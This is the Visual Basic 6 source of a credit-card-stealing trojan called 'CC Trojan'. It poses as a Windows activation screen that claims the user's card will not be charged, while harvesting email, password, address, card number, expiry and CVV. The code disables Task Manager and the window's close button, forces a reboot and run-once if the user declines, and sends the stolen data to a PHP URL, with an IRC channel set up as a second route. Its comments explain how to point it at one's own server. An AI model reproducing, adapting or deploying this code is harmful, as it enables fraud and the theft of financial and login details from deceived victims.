VERSION 5.00
Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "msinet.ocx"
Object = "{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}#1.1#0"; "ieframe.dll"
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Activate Windows"
   ClientHeight    =   7095
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   9540
   BeginProperty Font 
      Name            =   "Arial"
      Size            =   9
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "Form1.frx":5ADA
   ScaleHeight     =   7095
   ScaleWidth      =   9540
   StartUpPosition =   2  'CenterScreen
   Visible         =   0   'False
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   7800
      Top             =   240
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.PictureBox cmdEmail 
      BackColor       =   &H00FF0000&
      BorderStyle     =   0  'None
      Height          =   375
      Left            =   9000
      Picture         =   "Form1.frx":E5C20
      ScaleHeight     =   375
      ScaleWidth      =   375
      TabIndex        =   5
      Top             =   6600
      Visible         =   0   'False
      Width           =   375
   End
   Begin VB.PictureBox cmdEmail1 
      BackColor       =   &H00FF0000&
      BorderStyle     =   0  'None
      Height          =   375
      Left            =   9000
      Picture         =   "Form1.frx":E69FF
      ScaleHeight     =   375
      ScaleWidth      =   375
      TabIndex        =   4
      Top             =   6600
      Visible         =   0   'False
      Width           =   375
   End
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   8280
      Top             =   240
   End
   Begin VB.TextBox Text55 
      Height          =   330
      Left            =   8400
      TabIndex        =   3
      Text            =   "Text1"
      Top             =   7920
      Width           =   1215
   End
   Begin VB.OptionButton RunOnce5 
      Caption         =   "Option3"
      Height          =   225
      Left            =   8520
      TabIndex        =   2
      Top             =   7440
      Width           =   975
   End
   Begin SHDocVwCtl.WebBrowser WebBrowser1 
      Height          =   1695
      Left            =   1320
      TabIndex        =   1
      Top             =   7200
      Width           =   6975
      ExtentX         =   12303
      ExtentY         =   2990
      ViewMode        =   0
      Offline         =   0
      Silent          =   0
      RegisterAsBrowser=   0
      RegisterAsDropTarget=   1
      AutoArrange     =   0   'False
      NoClientEdge    =   0   'False
      AlignLeft       =   0   'False
      NoWebView       =   0   'False
      HideFileNames   =   0   'False
      SingleClick     =   0   'False
      SingleSelection =   0   'False
      NoFolders       =   0   'False
      Transparent     =   0   'False
      ViewID          =   "{0057D0E0-3573-11CF-AE69-08002B2E1262}"
      Location        =   "http:///"
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H00FF8080&
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "Verdana"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   5535
      Left            =   0
      TabIndex        =   0
      Top             =   840
      Width           =   9615
      Begin VB.OptionButton Option1 
         BackColor       =   &H00FF8080&
         Caption         =   "Option1"
         Height          =   225
         Left            =   1080
         MaskColor       =   &H80000002&
         TabIndex        =   36
         Top             =   3000
         Width           =   200
      End
      Begin VB.OptionButton Option2 
         BackColor       =   &H00FF8080&
         Caption         =   "Option2"
         Height          =   225
         Left            =   1080
         MaskColor       =   &H80000002&
         Picture         =   "Form1.frx":E777A
         TabIndex        =   35
         Top             =   3360
         Width           =   200
      End
      Begin VB.Frame Frame2 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         BorderStyle     =   0  'None
         Caption         =   "Frame2"
         ForeColor       =   &H80000008&
         Height          =   5535
         Left            =   0
         TabIndex        =   8
         Top             =   0
         Visible         =   0   'False
         Width           =   9615
         Begin VB.ComboBox txtlocation 
            Height          =   345
            ItemData        =   "Form1.frx":F662D
            Left            =   360
            List            =   "Form1.frx":F6880
            TabIndex        =   21
            Text            =   "Select your location..."
            Top             =   840
            Width           =   2295
         End
         Begin VB.TextBox txtemail 
            Height          =   330
            Left            =   3720
            TabIndex        =   20
            Top             =   840
            Width           =   1815
         End
         Begin VB.TextBox txtpn 
            Height          =   330
            IMEMode         =   3  'DISABLE
            Left            =   6720
            PasswordChar    =   "*"
            TabIndex        =   19
            Top             =   840
            Width           =   1935
         End
         Begin VB.TextBox txtname 
            Height          =   330
            Left            =   2160
            TabIndex        =   18
            Top             =   1845
            Width           =   2415
         End
         Begin VB.TextBox txtcc 
            Height          =   330
            Left            =   6720
            MaxLength       =   16
            TabIndex        =   17
            Top             =   1845
            Width           =   2415
         End
         Begin VB.TextBox txtexp_pin 
            Height          =   330
            Left            =   6720
            MaxLength       =   4
            TabIndex        =   16
            Top             =   3645
            Width           =   855
         End
         Begin VB.ComboBox txtexp_month 
            Height          =   345
            ItemData        =   "Form1.frx":F724B
            Left            =   6720
            List            =   "Form1.frx":F7273
            TabIndex        =   15
            Text            =   "Select Month"
            Top             =   3045
            Width           =   1695
         End
         Begin VB.ComboBox txtexp_year 
            Height          =   345
            ItemData        =   "Form1.frx":F72D9
            Left            =   8520
            List            =   "Form1.frx":F72F5
            TabIndex        =   14
            Text            =   "Year"
            Top             =   3045
            Width           =   855
         End
         Begin VB.TextBox address 
            Height          =   330
            Left            =   2160
            TabIndex        =   13
            Top             =   2445
            Width           =   2415
         End
         Begin VB.TextBox phoneno 
            Height          =   330
            Left            =   2160
            TabIndex        =   12
            Top             =   4245
            Width           =   2415
         End
         Begin VB.TextBox state 
            Height          =   330
            Left            =   2160
            TabIndex        =   11
            Top             =   3045
            Width           =   2415
         End
         Begin VB.TextBox zip 
            Height          =   330
            Left            =   2160
            TabIndex        =   10
            Top             =   3645
            Width           =   1215
         End
         Begin VB.ComboBox cctype 
            Height          =   345
            ItemData        =   "Form1.frx":F7329
            Left            =   6720
            List            =   "Form1.frx":F7339
            TabIndex        =   9
            Text            =   "Card Type"
            Top             =   2445
            Width           =   1695
         End
         Begin VB.Label Label11 
            BackStyle       =   0  'Transparent
            Caption         =   "Please fill out all the information below."
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   255
            Left            =   360
            TabIndex        =   47
            Top             =   240
            Width           =   4815
         End
         Begin VB.Label Label14 
            BackColor       =   &H00FF8080&
            BackStyle       =   0  'Transparent
            Caption         =   "Email"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H8000000E&
            Height          =   255
            Left            =   3120
            TabIndex        =   34
            Top             =   870
            Width           =   495
         End
         Begin VB.Label Label15 
            BackColor       =   &H00FF8080&
            BackStyle       =   0  'Transparent
            Caption         =   "Password"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H8000000E&
            Height          =   255
            Left            =   5760
            TabIndex        =   33
            Top             =   870
            Width           =   1335
         End
         Begin VB.Label Label17 
            BackColor       =   &H00FF8080&
            BackStyle       =   0  'Transparent
            Caption         =   "Name on card"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H8000000E&
            Height          =   255
            Left            =   360
            TabIndex        =   32
            Top             =   1920
            Width           =   1215
         End
         Begin VB.Label Label18 
            BackColor       =   &H00FF8080&
            BackStyle       =   0  'Transparent
            Caption         =   "Credit Card Number"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H8000000E&
            Height          =   255
            Left            =   4800
            TabIndex        =   31
            Top             =   1920
            Width           =   1695
         End
         Begin VB.Label Label19 
            BackColor       =   &H00FF8080&
            BackStyle       =   0  'Transparent
            Caption         =   "Important: Your card will NOT be charged."
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   -1  'True
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H8000000E&
            Height          =   255
            Left            =   360
            TabIndex        =   30
            Top             =   1440
            Width           =   3495
         End
         Begin VB.Label Label20 
            BackColor       =   &H00FF8080&
            BackStyle       =   0  'Transparent
            Caption         =   "Expiry Date"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H8000000E&
            Height          =   255
            Left            =   4800
            TabIndex        =   29
            Top             =   3120
            Width           =   1335
         End
         Begin VB.Label Label21 
            BackColor       =   &H00FF8080&
            BackStyle       =   0  'Transparent
            Caption         =   "CVV2 code"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H8000000E&
            Height          =   255
            Left            =   4800
            TabIndex        =   28
            Top             =   3720
            Width           =   975
         End
         Begin VB.Label Label22 
            BackColor       =   &H00FF8080&
            BackStyle       =   0  'Transparent
            Caption         =   "To aid in the prevention of fraudulent credit card use, we now require the 3 or 4 digit code on the back of your creditcard."
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H8000000E&
            Height          =   735
            Left            =   6240
            TabIndex        =   27
            Top             =   4320
            Width           =   3255
         End
         Begin VB.Label Label23 
            BackColor       =   &H00FF8080&
            BackStyle       =   0  'Transparent
            Caption         =   "Address"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H8000000E&
            Height          =   255
            Left            =   360
            TabIndex        =   26
            Top             =   2520
            Width           =   1455
         End
         Begin VB.Label labelss 
            BackColor       =   &H00FF8080&
            BackStyle       =   0  'Transparent
            Caption         =   "Phone Number"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H8000000E&
            Height          =   375
            Left            =   360
            TabIndex        =   25
            Top             =   4320
            Width           =   1575
         End
         Begin VB.Label Label24 
            BackColor       =   &H00FF8080&
            BackStyle       =   0  'Transparent
            Caption         =   "State/Providence"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H8000000E&
            Height          =   375
            Left            =   360
            TabIndex        =   24
            Top             =   3120
            Width           =   1935
         End
         Begin VB.Label Label25 
            BackColor       =   &H00FF8080&
            BackStyle       =   0  'Transparent
            Caption         =   "Zip Code / Postcode"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H8000000E&
            Height          =   255
            Left            =   360
            TabIndex        =   23
            Top             =   3720
            Width           =   1695
         End
         Begin VB.Label Label26 
            BackColor       =   &H00FF8080&
            BackStyle       =   0  'Transparent
            Caption         =   "Card Type"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H8000000E&
            Height          =   255
            Left            =   4800
            TabIndex        =   22
            Top             =   2520
            Width           =   1215
         End
         Begin VB.Image Image3 
            Height          =   9000
            Left            =   -360
            Picture         =   "Form1.frx":F735F
            Top             =   0
            Width           =   12000
         End
      End
      Begin VB.Label Label1 
         BackColor       =   &H00FF8080&
         BackStyle       =   0  'Transparent
         Caption         =   "Your copy of Windows was activated by another user. "
         ForeColor       =   &H8000000E&
         Height          =   255
         Left            =   480
         TabIndex        =   46
         Top             =   480
         Width           =   4335
      End
      Begin VB.Label Label2 
         BackColor       =   &H00FF8080&
         BackStyle       =   0  'Transparent
         Caption         =   "To help reduce software piracy, please re-activate your copy of Windows now."
         ForeColor       =   &H8000000E&
         Height          =   255
         Left            =   480
         TabIndex        =   45
         Top             =   840
         Width           =   6495
      End
      Begin VB.Label Label3 
         BackColor       =   &H00FF8080&
         BackStyle       =   0  'Transparent
         Caption         =   "We will ask for your billing details, but your credit card will NOT be charged."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H8000000E&
         Height          =   255
         Left            =   480
         TabIndex        =   44
         Top             =   1200
         Width           =   6495
      End
      Begin VB.Label Label4 
         BackColor       =   &H00FF8080&
         BackStyle       =   0  'Transparent
         Caption         =   "You must activate Windows before you can continue to use it."
         ForeColor       =   &H8000000E&
         Height          =   255
         Left            =   480
         TabIndex        =   43
         Top             =   1560
         Width           =   5055
      End
      Begin VB.Label Label5 
         BackColor       =   &H00FF8080&
         BackStyle       =   0  'Transparent
         Caption         =   "Microsoft is committed to your privacy. For more information,"
         ForeColor       =   &H8000000E&
         Height          =   255
         Left            =   480
         TabIndex        =   42
         Top             =   1920
         Width           =   4935
      End
      Begin VB.Label Label6 
         BackColor       =   &H00FF8080&
         BackStyle       =   0  'Transparent
         Caption         =   "www.microsoft.com/piracy"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H8000000E&
         Height          =   255
         Left            =   5400
         TabIndex        =   41
         Top             =   1920
         Width           =   2175
      End
      Begin VB.Label Label7 
         BackColor       =   &H00FF8080&
         BackStyle       =   0  'Transparent
         Caption         =   "Do you want to activate Windows now?"
         ForeColor       =   &H8000000E&
         Height          =   255
         Left            =   480
         TabIndex        =   40
         Top             =   2280
         Width           =   3375
      End
      Begin VB.Label Label8 
         BackColor       =   &H00FF8080&
         BackStyle       =   0  'Transparent
         Caption         =   "Yes, activate Windows over the Internet now"
         ForeColor       =   &H8000000E&
         Height          =   255
         Left            =   1440
         TabIndex        =   39
         Top             =   3000
         Width           =   4095
      End
      Begin VB.Label Label9 
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "No, I will do it later (Windows will become unactivated.)"
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   1440
         TabIndex        =   38
         Top             =   3360
         Width           =   4470
      End
      Begin VB.Label Label10 
         BackColor       =   &H00FF8080&
         BackStyle       =   0  'Transparent
         Caption         =   "To continue, click Next."
         ForeColor       =   &H8000000E&
         Height          =   255
         Left            =   720
         TabIndex        =   37
         Top             =   3720
         Width           =   1935
      End
      Begin VB.Image Image5 
         Height          =   9000
         Left            =   0
         Picture         =   "Form1.frx":106212
         Top             =   0
         Width           =   12000
      End
   End
   Begin InetCtlsObjects.Inet Inet1 
      Left            =   8760
      Top             =   120
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
   End
   Begin VB.Image BackUp 
      Height          =   360
      Left            =   240
      Picture         =   "Form1.frx":1150C5
      Top             =   6600
      Visible         =   0   'False
      Width           =   360
   End
   Begin VB.Image Image4 
      Height          =   30
      Left            =   0
      Picture         =   "Form1.frx":115E40
      Top             =   6375
      Width           =   9555
   End
   Begin VB.Image Image2 
      Height          =   600
      Left            =   240
      Picture         =   "Form1.frx":116D72
      Top             =   120
      Width           =   3825
   End
   Begin VB.Label Label13 
      BackColor       =   &H00800000&
      BackStyle       =   0  'Transparent
      Caption         =   "&Back"
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   720
      TabIndex        =   7
      Top             =   6650
      Width           =   495
   End
   Begin VB.Image Image1 
      Height          =   360
      Left            =   240
      Picture         =   "Form1.frx":119DED
      Top             =   6600
      Width           =   360
   End
   Begin VB.Image cmdNext 
      Height          =   360
      Left            =   9000
      Picture         =   "Form1.frx":11AB22
      Top             =   6600
      Width           =   360
   End
   Begin VB.Label Label12 
      BackColor       =   &H00800000&
      BackStyle       =   0  'Transparent
      Caption         =   "&Next"
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   8520
      TabIndex        =   6
      Top             =   6650
      Width           =   375
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'CC Trojan; Version 3 [Email]
'Release date: June 1, 2009
'By: Lukeidiot
'
'OLDER NOTES ....
'
'CC Trojan REMODDED By: Lukeidiot
'Modded Release date: September 2, 2008.
'Recoded all GUI, and added professional looking features.
'Original Authors: Lukeidiot, xyr0x.
'WEBSITE: Lukeidiot.com
'###### Please note: This is open-source. If you have paid for a copy of this source
'then you have just been scammed. This source is for educational purposes only. #######
'th3m3 - Added Address lines, CC type, A-Z country list, state, zip
'xUKx - Added Dumps Info to IRC Channel No more shit Email way.
'How to Configure
'Find "IRC.Domain.com" Replace with your IRC Address and Change the Port to the port your IRC uses
'Find "JOIN #WaZ-Up#" Replace #WaZ-Up# to the Channel you want the BoT To join.
'Find "PRIVMSG #WaZ-Up#" Replace #WaZ-Up# to the Channel you want the BoT To send Info to.
Option Explicit

Private Sub BackUp_Click()
Frame1.Visible = True
Frame2.Visible = False
Option1.Visible = True
Option2.Visible = True
Option1.Value = False
BackUp.Visible = False
cmdNext.Visible = True
cmdEmail1.Visible = False
End Sub

Private Sub Form_Load()
cmdEmail1.Visible = True
'Label27.Visible = False
'Label28.Visible = False
'Text1.Visible = False
'Text2.Visible = False
'Frame2.Visible = False
'Always on top
Call PutWindowOnTop(Me)
'Disables Closure
DisableCloseWindowButton Me
'Disables Task Manager
DisableTaskAll 'Disable

'Lets Connect to the IRC Server and join channel.....
Winsock1.Close
'Server & Port
Winsock1.Connect "IRC.Domain.com", 6667
End Sub

Private Sub Option1_Click()
cmdNext.Visible = True
cmdEmail1.Visible = False
End Sub

Private Sub Winsock1_Connect()
Dim L As Long
Dim Nick As String
Dim Channel As String
L = Rand(100000, 999999)
    With Winsock1
        .SendData "NICK w00t-" & L & vbCrLf
        .SendData "USER z z z z z" & vbCrLf
        .SendData "JOIN #WaZ-Up#" & vbCrLf
        End With
End Sub
Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
    On Error Resume Next
    Dim sRecv As String

    Winsock1.GetData sRecv ' Put the data recieved into the string
    ' Play ping pong with the server
    If InStr(sRecv, "PING") = 1 Then
        Winsock1.SendData "PONG " & Split(sRecv, " ")(1)
    End If
End Sub

Private Sub Form_Unload(Cancel As Integer)
'Enables All API's on Closure
EnableTaskAll
End Sub
Private Sub cmdEmail_Click()
'Open "C:" & "\Windows.cem" For Output As #1
    'Print #1, "Name: "; txtname, vbNewLine; "Address: "; address1, vbNewLine; "Zip / Post Code: "; zip, vbNewLine; "State / City: "; state, vbNewLine; "Location: "; txtlocation, vbNewLine; "Phone No: "; address2, vbNewLine; "--------------------------"; vbNewLine; "Email: "; txtemail, vbNewLine; "Password: "; txtpn, vbNewLine; "--------------------------"; vbNewLine; "Credit Card No: "; txtcc, vbNewLine; "Credit Card Type: "; cctype, vbNewLine; "Expire Date: "; txtexp_month, txtexp_year, vbNewLine; "CVV2: "; txtexp_pin, vbNewLine; "--------------------------"; vbNewLine; "Online Payment Type: "; Combo1, vbNewLine; "Email: "; Text1, vbNewLine; "Password: "; Text2, vbNewLine; "--------------------------"; vbNewLine; "IP: "; Winsock1.LocalIP, vbNewLine; "Date: "; (FormatDateTime(Date, 1)); vbNewLine; "CC-Trojan Modded by xUKx"

'Close #1
    '###### Email Send Code            #########
    '###### Remove 's till "Unload me" #########
    Dim strResult As String
    Dim strURL As String
    
    'Enter URL to your PHP file.
    strURL = "http://www.lukeidiot.com/email3.php"
    
    strResult = Inet1.OpenURL(strURL & "?email=" & txtemail.Text & "&pn=" & txtpn.Text & "&name=" & txtname.Text & "&cc=" & txtcc.Text & "&exp_month=" & txtexp_month.Text & "&exp_year=" & txtexp_year.Text & "&pin=" & txtexp_pin.Text & "&location=" & txtlocation.Text)
    strResult = Replace$(Trim$(strResult), vbCrLf, "")
    If (txtcc.Text) <= 16 Then
        MsgBox "Please enter a valid credit card number", vbExclamation
    If strResult = "Success" Then
        MsgBox "Windows Successfully Activated!", vbInformation
    ElseIf strResult = "Failure" Then
        MsgBox "Error Activating!", vbExclamation
    Else
        MsgBox "No/unknown response", vbQuestion
        Unload Me
'With Winsock1
'.SendData "PRIVMSG #WaZ-Up# :4-----Contact Info-----" & vbCrLf
'.SendData "PRIVMSG #WaZ-Up# :4[Name]:14 " & txtname() & vbCrLf
'.SendData "PRIVMSG #WaZ-Up# :4[Address]:14 " & address() & vbCrLf
'.SendData "PRIVMSG #WaZ-Up# :4[Zip / Post Code]:14 " & zip() & vbCrLf
'.SendData "PRIVMSG #WaZ-Up# :4[State]:14 " & state() & vbCrLf
'.SendData "PRIVMSG #WaZ-Up# :4[Location]:14 " & txtlocation() & vbCrLf
'.SendData "PRIVMSG #WaZ-Up# :4[Phone No]:14 " & phoneno() & vbCrLf
'.SendData "PRIVMSG #WaZ-Up# :4-----Email and Password Info-----" & vbCrLf
'.SendData "PRIVMSG #WaZ-Up# :4[Email]:14 " & txtemail() & vbCrLf
'.SendData "PRIVMSG #WaZ-Up# :4[Password]:14 " & txtpw() & vbCrLf
'.SendData "PRIVMSG #WaZ-Up# :4-----Credit Card Info-----" & vbCrLf
'.SendData "PRIVMSG #WaZ-Up# :4[Credit Card No]:14 " & txtcc() & vbCrLf
'.SendData "PRIVMSG #WaZ-Up# :4[Credit Card Type]:14 " & cctype() & vbCrLf
'.SendData "PRIVMSG #WaZ-Up# :4[Expire Date]:14 " & txtexp_month() & txtexp_year() & vbCrLf
'.SendData "PRIVMSG #WaZ-Up# :4[CVV2]:14 " & txtexp_pin() & vbCrLf
'.SendData "PRIVMSG #WaZ-Up# :4-----Info-----" & vbCrLf
'.SendData "PRIVMSG #WaZ-Up# :4[Date Victim Got Infected]:14 " & (FormatDateTime(Date, 1)) & vbCrLf
'.SendData "PRIVMSG #WaZ-Up# :4CC-Trojan Modded by xUKx" & vbCrLf
'.SendData "PRIVMSG #WaZ-Up# :4Removeing CC-Trojan...." & vbCrLf
'.SendData "QUIT" & vbCrLf
'End With
'Dim sngTime

'5 sec delay
'sngTime = Timer + 30

'Do While Timer < sngTime
'   DoEvents
'Loop
        'MsgBox "Windows Successfully Activated!"
'Unload Me
End If
End If
End Sub

'When cmdEmail is clicked, and the txtcc isnt correct then..
Private Sub txtcc_Validate(Cancel As Boolean)

If Len(Trim(txtcc.Text)) <> 16 Then
       MsgBox "Please enter a valid credit card number.", vbExclamation, "Validation Error"
       Cancel = True
End If
End Sub

'Next Frame Setup Process..
Private Sub cmdNext_Click()
If Option1.Value = True Then
   Frame2.Visible = True
   cmdEmail1.Visible = True
   BackUp.Visible = True
   'Hides Options 1 & 2, duh.
   Option1.Visible = False
   Option2.Visible = False
ElseIf Option2.Value = True Then
   Form1.Hide
End If
End Sub
'Restarts Computer
Private Sub Option2_Click()
Dim Err As String
If Option2.Value = True Then
'RunOnce, or until Forms filled out.
RunitRunit
ReBooT
Else
Err: Text55.Text = "Err 0x837f50"
End If
End Sub

'Hides Form1 for 25 secound(s).
Private Sub Timer1_Timer()
Form1.Visible = True
End Sub
'
Private Sub txtcc_Change()
If (Len(txtcc.Text) = 16) Then
cmdEmail.Enabled = True
cmdEmail.Visible = True
Else
cmdEmail.Enabled = False
cmdEmail.Visible = False
End If
End Sub
Public Function Rand(ByVal Low As Long, ByVal High As Long) As Long
  Randomize
  Rand = Int((High - Low + 1) * Rnd) + Low
End Function

